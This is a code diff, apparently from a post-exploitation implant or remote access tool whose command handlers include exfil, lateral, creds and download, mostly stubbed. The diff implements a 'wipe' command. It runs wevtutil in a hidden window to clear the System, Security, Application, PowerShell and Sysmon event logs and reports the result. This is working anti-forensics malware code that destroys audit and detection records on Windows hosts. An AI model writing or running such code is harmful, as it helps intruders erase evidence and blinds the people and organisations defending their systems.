@@ -720,7 +720,38 @@ static std::wstring HandlePs(const std::string& /*args*/) {
 }
 static std::wstring HandleLol(const std::string& /*args*/)     { return L"[lol: not implemented]"; }
 static std::wstring HandleExfil(const std::string& /*args*/)   { return L"[exfil: not implemented]"; }
-static std::wstring HandleWipe(const std::string& /*args*/)    { return L"[wipe: not implemented]"; }
+static std::wstring HandleWipe(const std::string& /*args*/) {
+    static const wchar_t* kLogs[] = {
+        L"System", L"Security", L"Application",
+        L"Microsoft-Windows-PowerShell/Operational",
+        L"Microsoft-Windows-Sysmon/Operational",
+        nullptr
+    };
+    wchar_t sysRoot[MAX_PATH] = {};
+    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
+    std::wstring wevtutil = std::wstring(sysRoot) + L"\\System32\\wevtutil.exe";
+    std::wstring out;
+    for (int i = 0; kLogs[i]; ++i) {
+        std::wstring cmd = L"\"" + wevtutil + L"\" cl \"" + std::wstring(kLogs[i]) + L"\"";
+        STARTUPINFOW si = {};
+        PROCESS_INFORMATION pi = {};
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
+                           CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, 5000);
+            DWORD exitCode = 1;
+            GetExitCodeProcess(pi.hProcess, &exitCode);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            out += std::wstring(kLogs[i]) + (exitCode == 0 ? L": cleared\n" : L": failed (access denied?)\n");
+        } else {
+            out += std::wstring(kLogs[i]) + L": spawn failed\n";
+        }
+    }
+    return L"[+] Log wipe complete:\n" + out;
+}
 static std::wstring HandleLateral(const std::string& /*args*/) { return L"[lateral: not implemented]"; }
 static std::wstring HandleCreds(const std::string& /*args*/)   { return L"[creds: not implemented]"; }
 static std::wstring HandleDownload(const std::string& /*args*/) { return L"[download: not implemented]"; }
